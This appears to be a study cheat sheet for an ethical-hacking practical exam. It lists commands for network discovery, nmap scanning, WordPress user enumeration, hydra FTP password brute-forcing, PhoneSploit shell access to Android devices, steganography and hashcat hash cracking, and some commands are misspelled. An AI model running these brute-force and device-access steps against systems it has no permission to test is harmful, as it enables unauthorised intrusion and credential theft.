### 1. Find the IP target.
 ```
  $ ip addr
  $ netdiscover  (If not found $ apt-get install netdiscover)
  $ netdiscover -i eth0   (confirm from ifconfig which net/wifi using)
  $ netdiscover -r IP/24  
 ```
### 2. Nmap scan all
  ```
  $ nmap IP -sV -sC -p -O -oN output.txt
  
  -iL=import IPs,  --top-ports 1000
  ```
### 3. IPs Service, RDP(3389), SQL(3306), FTP(21) check
 ```
  $ nmap -Pn -p 3389 IP | grep open
  $ nmap -Pn -p 3306 IP | grep open
  $ nmap -Pn -p 21 IP | grep open
  ```
### 4. Windows Comman Line
  $ Net user

### 5. Wordlist location find
 ```
  $ locate wordlists
  $ locae rockyou.txt
```
### 6. WP scan (Wp Vulnerability)
```
  $ wpscan --url IP --enumerate u
  
  --enumerate p, -U username, -P password, --usernames userlist.txt, --passwords passwdlist.txt
 
 => msfconsole 
use axiliary/scanner/http/wordpress_login_enum
PASS_FILE /root/Desktop/wordlists/Pass.txt
set RHOSTs IP
set RPORT PORT
set TARGETURI http://IP:port
set USERNAME admin
->run
```
### 7. FTP Passowrd find
  $ hydra -l user -P passlist.txt ftp://IP

### 8. Prints the route that a packet takes to reach the host
  $ traceroute google.com

### 9. Android
```
  $ netdiscover -r IP/24   (got final IP)
  $ nmap -O IP
  
  apt install adb
  pip install colorama
  git clone https://github.com/aerosol-can/PhoneSploit
  cd PhoneSploit
  python3 phonesploit.py
  select 3 to connect new phone
  Add IP address of android device
  4 (Access shell on phone)
  IP address again of android device
  pwd > ls > cd sdcard > ls > cd downloads > cat file.txt
```
### 10. Stegography
  ```
  $ Snow.exe -C -p “given_password” file_name.txt  (Pass tu hobo = 'test')
  -C  compressing / uncompressing
  -p  password

  Open Stego (GUI tool):
     Open the exe > open and select file > click get
 ```
### 11. Cryptography
```
#### Identify:
https://hashes.com/en/tools/hash_identifier
https://www.onlinehashcrack.com/hash-identification.php
https://www.tunnelsup.com/hash-analyzer
#### Crak hash:
https://hashes.com/en/decrypt/hash
https://crackstation.net

  $ hash-identifier  ->Enter and paste the hash.
  $ Hashcat -a 3 -m 900 hash.txt /rockyou.txt
  $ haiti -e <crypto_hash>    (https://noraj.github.io/haiti/#/pages/usage)
  
  -a attack mode (3)
  -m hashtype (select number fom below)
   900 = md4
   1800 = SHA512CRYPT
   110  = SHA1 with SALT HASH
   0  = MD5
   100 = SHA1
   1400 = SHA256
  ``` 
## 12. Used Tools
```
Veracrypt
Cryptool
Snow
Bctextencoder
Md5 & sha1 checksum utility
Wpscan
Nmap
Metasploit
Hydra
Wireshark
Winscp
OWASP ZAP  
RDP
```
